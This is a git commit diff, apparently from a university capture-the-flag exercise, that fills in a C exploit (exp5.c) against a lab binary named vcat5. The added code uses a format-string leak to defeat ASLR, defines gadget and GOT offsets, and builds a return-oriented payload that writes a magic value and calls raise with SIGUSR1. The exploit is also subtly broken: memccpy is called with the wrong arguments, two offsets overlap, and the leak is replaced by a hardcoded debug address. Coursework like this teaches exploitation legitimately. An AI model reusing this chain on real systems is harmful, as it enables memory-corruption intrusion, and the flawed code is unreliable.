91870f9ad76bc35c8637a1faa4df22b6aa6d1679
ebielawa <edward_bielawa@brown.edu>
2022-11-06 19:56:49 -0500

    Flag 3 Debug Mode

--- ctf-3/exp5.c
+++ ctf-3/exp5.c
@@ -15,11 +15,33 @@
 
 #define	MAX_VAL		0xF0000000UL
 #define	BUF_SZ		sizeof("0x00000000")
-#define	FMT_STR		"%22$x"	/* FIXME	*/
-#define BIN_BASE_OFF	0x0		/* FIXME	*/
+#define	FMT_STR		"%22$p"
 
-// To leak return address: %22$x (which has offset 0x15c4 from the start of the file)
+// Determine how far to copy along in our payload buffer
+#define RET_ADDR1_OFF 0x0000004a
+#define DATA1_OFF (RET_ADDR1_OFF + 4)
+#define RET_ADDR2_OFF (DATA1_OFF + 4)
+#define RET_ADDR3_OFF (RET_ADDR2_OFF + 8)
+#define RET_ADDR4_OFF (RET_ADDR3_OFF + 4)
+#define DATA2_OFF (RET_ADDR4_OFF + 4)
+#define RET_ADDR5_OFF (RET_ADDR4_OFF + 4)
 
+// Debugging offsets
+#define LEAK_OFF 0x000015c4
+#define DEBUG_LEAK 0x410015c4
+
+// Variables and GOT offsets:
+#define GOT_OFF 0x00003114
+#define MGK1_OFF 0x00005008
+#define MGK2_OFF 0x0000500c
+#define RND1_OFF 0x00004004
+#define RND2_ODD 0x00004008
+
+// Gadget offsets:
+#define POP_EDX_OFF 0x0000124f
+#define POP_EBX_OFF 0x0000101e
+#define MOV_INDIR_EBX_EDX_OFF 0x0000125f
+#define RAISE_PLT_OFF 0x00001030
 
 unsigned char payload[] =
 	/* ------------------------------------	*/
@@ -29,7 +51,16 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	/* FIXME */
 	/* ------------------------------------	*/
-	"\xef\xbe\xad\xde";
+	"\x38\x71\x88\x0c"		// Address of pop edx gadget
+	"\x08\xb0\x88\x0c"		// Address of magic
+	"\x1e\x90\x04\x08"		// Address of pop ebx gadget
+	"\xed\xac\xef\x0d"		// 0x0defaced (in little endian)
+	"\x48\x71\x88\x0c"		// Address of mov ebx to [edx] (0x0c887148)
+	"\x1e\x90\x04\x08"		// Address of pop ebx gadget
+	"\xef\xbe\xad\xde"		// Address of GOT table (for raise)
+	"\x30\x90\x04\x08"		// Address of raise in .plt (0x08049030)
+	"\xef\xbe\xad\xde"		// DEADBEEF (extra return address)
+	"\x0a\x00\x00\x00";		// SIGUSR1
 	/* ------------------------------------	*/
 
 
@@ -42,6 +73,9 @@ main(int argc, char **argv)
 	/* base address of `vcat5'		*/
 	unsigned long	baddr;
 
+	/* for ASLR goodies and whatnot */
+	unsigned long addr_aslr;
+
 	/* helper				*/
 	struct stat	istat;
 
@@ -49,10 +83,12 @@ main(int argc, char **argv)
 	memset(buf, 0, BUF_SZ);
 
 	/* leak the base address of `vcat5'	*/
-	write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
-	read(STDIN_FILENO, buf, BUF_SZ-1);
-	write(STDOUT_FILENO, buf, BUF_SZ-1);
-	baddr = strtoul(buf, NULL, 16) - BIN_BASE_OFF;
+	// write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
+	// read(STDIN_FILENO, buf, BUF_SZ-1);
+	// baddr = strtoul(buf, NULL, 16) - LEAK_OFF;
+
+	// For debug only:
+	baddr = DEBUG_LEAK - LEAK_OFF;
 
 	/* sanity check 			*/
 	if (!fstat(STDIN_FILENO, &istat) && !S_ISFIFO(istat.st_mode)) {
@@ -66,14 +102,27 @@ main(int argc, char **argv)
 	}
 
 	/* fix the payload			*/
-	/* FIXME				*/
+	addr_aslr = baddr + POP_EDX_OFF;
+	memcpy(payload + RET_ADDR1_OFF, &addr_aslr, sizeof(addr_aslr));
+	addr_aslr = baddr + MGK1_OFF;
+	memccpy(payload + DATA1_OFF, &addr_aslr, sizeof(addr_aslr));
+	addr_aslr = baddr + POP_EBX_OFF;
+	memccpy(payload + RET_ADDR2_OFF, &addr_aslr, sizeof(addr_aslr));
+	addr_aslr = baddr + MOV_INDIR_EBX_EDX_OFF;
+	memcpy(payload + RET_ADDR3_OFF, &addr_aslr, sizeof(addr_aslr));
+	addr_aslr = baddr + POP_EBX_OFF;
+	memccpy(payload + RET_ADDR4_OFF, &addr_aslr, sizeof(addr_aslr));
+	addr_aslr = baddr + GOT_OFF;
+	memccpy(payload + DATA2_OFF, &addr_aslr, sizeof(addr_aslr));
+	addr_aslr = baddr + RAISE_PLT_OFF;
+	memccpy(payload + RET_ADDR5_OFF, &addr_aslr, sizeof(addr_aslr));
 
 	/*
 	 * dump the payload in 'stdout'
 	 * sizeof(payload)-1:	ignore the trailing '\0';
 	 *			(strings are NULL terminated)
 	 */
-	//write(STDOUT_FILENO, payload, sizeof(payload)-1);
+	write(STDOUT_FILENO, payload, sizeof(payload)-1);
 
 	/* done; success			*/
 	return EXIT_SUCCESS;
